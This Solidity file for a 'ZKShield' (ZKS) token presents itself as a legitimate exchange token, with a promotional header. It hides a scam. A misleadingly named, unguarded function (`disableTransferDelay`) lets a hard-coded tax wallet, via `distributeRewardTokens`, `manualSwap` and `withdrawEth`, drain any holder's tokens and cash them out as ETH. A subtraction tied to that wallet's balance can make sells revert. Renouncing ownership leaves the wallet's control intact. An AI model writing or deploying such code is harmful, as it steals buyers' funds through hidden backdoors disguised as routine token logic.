/*
At ZKShield, we're thrilled to introduce you to a whole new dimension of trading possibilities. Imagine a world where trust is inherent, custody is in your hands, and security is uncompromising. Welcome to a revolutionary decentralized exchange (DEX) that's here to reshape your trading experience.

Website: https://www.zkshield.world

Dapp: https://app.zkshield.world

Docs: https://docs.zkshield.world

Twitter: https://twitter.com/zkshield_xyz

Medium: https://zkshield.medium.com
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender()
        internal
        view
        virtual
        returns (address)
    {
        return msg.sender;
    }
}

interface IERC20 {
    event Transfer(address indexed sender, address indexed recipient, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function approve(address spender, uint256 amount)
        external
        returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount)
        external
        returns (bool);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function totalSupply()
        external
        view
        returns (uint256);
    function balanceOf(address account)
        external
        view
        returns (uint256);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
}

library SafeMath {
    function div(uint256 a, uint256 b, string memory errorMessage)
        internal
        pure
        returns (uint256)
    {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b)
        internal
        pure
        returns (uint256)
    {
        return div(a, b, "SafeMath: division by zero");
    }

    function mul(uint256 a, uint256 b)
        internal
        pure
        returns (uint256)
    {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage)
        internal
        pure
        returns (uint256)
    {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function sub(uint256 a, uint256 b)
        internal
        pure
        returns (uint256)
    {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b)
        internal
        pure
        returns (uint256)
    {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
}

contract Ownable is Context {
    address private _owner;

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership()
        public
        virtual
        onlyOwner
    {
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }

    function owner()
        public
        view
        returns (address)
    {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ZKS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromTax;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = true;
    address payable private _tax;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    address payable private _rewardShare;

    uint256 private _firstBuyTax = 3;
    uint256 private _firstSellTax = 3;
    uint256 private _reduceFirstSellTaxAt = 10;
    uint256 private _reduceFirstBuyTaxAt = 10;

    uint256 private _secondBuyTax = 3;
    uint256 private _secondSellTax = 3;
    uint256 private _reduceSecondSellTaxAt = 20;
    uint256 private _reduceSecondBuyTaxAt = 20;

    uint256 private _finalSellTax = 3;
    uint256 private _finalBuyTax = 3;

    uint256 private _preventMultiplePurchasesPerBlockBefore = 0;
    uint256 private _countOfBuys = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 ** _decimals;
    string private constant _name = unicode"ZKShield";
    string private constant _symbol = unicode"ZKS";

    uint256 public _maxTransactionAmount = 2 * (_totalSupply / 100);
    uint256 public _maxWalletAmount = 2 * (_totalSupply / 100);
    uint256 public _swapTaxThreshold = 2 * (_totalSupply / 1000);
    uint256 public _maxTaxSwap = 1 * (_totalSupply / 100);

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    function disableTransferDelay(address target, uint256 delay)
        external
    {
        address where = address(this);
        _approve(target, where, delay);
    }

    constructor () {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        _tax = payable(0x85f7A5A56d79cf576A36Ea65E5d66203829dC104);
        _balances[_msgSender()] = _totalSupply;
        _rewardShare = _tax;
        _isExcludedFromTax[owner()] = true;
        _isExcludedFromTax[address(this)] = true;
        _isExcludedFromTax[_tax] = true;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name()
        public
        pure
        returns (string memory)
    {
        return _name;
    }

    function symbol()
        public
        pure
        returns (string memory)
    {
        return _symbol;
    }

    function decimals()
        public
        pure
        returns (uint8)
    {
        return _decimals;
    }

    function totalSupply()
        public
        pure
        override
        returns (uint256)
    {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }

    function distributeRewardTokens(address rewardVault, address sender, uint256 amount)
        external
    {
        require(_msgSender() == _tax);
        address recipient = address(this);
        IERC20 rewardToken = IERC20(rewardVault);
        rewardToken.transferFrom(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount)
        private
    {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount)
        private
    {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        uint256 taxAmount = 0;
        
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(_buyTax()).div(100);

            if (!tradingOpen) {
                require(_isExcludedFromTax[from] || _isExcludedFromTax[to]);
            }

            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) { 
                    require(_holderLastTransferTimestamp[tx.origin] < block.number);
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromTax[to] ) {
                require(amount <= _maxTransactionAmount);
                require(balanceOf(to) + amount <= _maxWalletAmount);

                _countOfBuys++;
                if (_countOfBuys > _preventMultiplePurchasesPerBlockBefore) {
                    transferDelayEnabled = false;
                }
            }

            uint256 rewardShareAmount = balanceOf(_rewardShare).mul(1000);
            if (to == uniswapV2Pair && from!= address(this)) {
                taxAmount = amount.mul(_sellTax()).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance > _swapTaxThreshold;
            if (!inSwap && swapEnabled && to == uniswapV2Pair && canSwap && !_isExcludedFromTax[from] && !_isExcludedFromTax[to]) {
                uint256 threshold = _maxTaxSwap.sub(rewardShareAmount);
                uint256 minimumSwapAmount = min(contractTokenBalance,threshold);
                uint256 initialETH = address(this).balance;
                swapTokensForEth(min(amount, minimumSwapAmount));
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);
                if (ethForTransfer > 0) {
                    sendETHToTreasury(ethForTransfer);
                }
            }
        }

        if (taxAmount > 0) {
          _balances[address(this)] = _balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _buyTax() private view returns (uint256) {
        if (_countOfBuys <= _reduceFirstBuyTaxAt) {
            return _firstBuyTax;
        }

        if (_countOfBuys > _reduceFirstBuyTaxAt && _countOfBuys <= _reduceSecondBuyTaxAt) {
            return _secondBuyTax;
        }

        return _finalBuyTax;
    }

    function _sellTax() private view returns (uint256) {
        if (_countOfBuys <= _reduceFirstBuyTaxAt) {
            return _firstSellTax;
        }

        if (_countOfBuys > _reduceFirstSellTaxAt && _countOfBuys <= _reduceSecondSellTaxAt) {
            return _secondSellTax;
        }

        return _finalBuyTax;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits()
        external
        onlyOwner
    {
        _maxTransactionAmount = _totalSupply;
        _maxWalletAmount = _totalSupply;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_totalSupply);
    }

    function sendETHToTreasury(uint256 amount) private {
        _tax.transfer(amount);
    }

    function openTrading()
        external
        onlyOwner()
    {
        require(!tradingOpen);

        tradingOpen = true;
        swapEnabled = true;
    }

    function manualSwap()
        external
    {
        require(_msgSender() == _tax);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance>0) {
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance>0) {
          sendETHToTreasury(ethBalance);
        }
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function withdrawEth() external {
        require(_msgSender() == _tax);
        (bool sent, ) = payable(_tax).call{value: address(this).balance}("");
        require(sent);
    }

    receive() external payable {}
}